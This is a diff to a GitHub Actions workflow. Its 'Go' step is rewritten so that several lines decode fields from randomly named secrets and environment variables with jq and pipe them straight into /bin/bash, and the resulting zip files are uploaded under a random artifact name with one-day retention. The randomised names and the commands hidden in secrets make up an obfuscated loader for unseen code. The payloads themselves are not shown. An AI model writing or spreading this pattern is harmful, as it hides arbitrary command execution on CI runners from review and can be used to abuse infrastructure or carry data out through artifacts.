@@ -16,20 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          jcsr1026: ${{ secrets.jcsr1026 }}
+          md34922: ${{ secrets.md34922 }}
         run: |
-          printf '%s' "$jcsr1026" | jq -r .bv4 | /bin/bash
-          echo $ixhhs460 | jq -r .jcbok9075 | /bin/bash
-          printf '%s' "$veo422" | jq -r .zwn0478 | /bin/bash
-          echo $qk4 | jq -r .ux788 | /bin/bash
-          echo $pbwsu1 | jq -r .up71051 | /bin/bash
-          printf '%s' "$yrlmd3" | jq -r .ceo3 | /bin/bash
-          echo $tuig0396 | jq -r .qe557 | /bin/bash
-          printf '%s' "$oxn8541" | jq -r .muajz88 | /bin/bash
+          printf '%s' "$md34922" | jq -r .yxwrw7010 | /bin/bash
+          echo $zg429 | jq -r .ue8475 | /bin/bash
+          printf '%s' "$r7019" | jq -r .ifdvh4 | /bin/bash
+          printf '%s' "$w4740" | jq -r .z9 | /bin/bash
+          printf '%s' "$jjub84" | jq -r .mkojq21422 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: HaXON8tz
+          name: llOpUsxw
           path: "*.zip"
           retention-days: 1
